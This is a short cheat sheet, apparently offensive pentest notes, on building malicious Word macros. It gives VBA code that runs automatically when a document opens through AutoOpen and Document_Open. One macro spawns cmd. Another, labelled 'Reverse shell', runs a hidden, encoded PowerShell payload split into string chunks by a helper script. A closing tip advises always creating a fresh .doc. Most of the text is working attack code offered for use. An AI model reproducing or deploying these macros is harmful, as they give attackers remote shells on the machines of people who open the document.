# How to create Macros for MS Office

1. empty document in word and save as 97-2003 doc
2. View - Macros
3. Create and select current document

## CMD

```python

Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "cmd"
  
End Sub
```

## Reverse shell

```python
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    #use splitter.py 
    #str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
    #n = 50
    #for i in range(0, len(str), n):
	#print "Str = Str + " + '"' + str[i:i+n] + '"'

    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    #etc.

    CreateObject("Wscript.Shell").Run Str
End Sub

```

* Always create a new .doc, don't reuse the old ones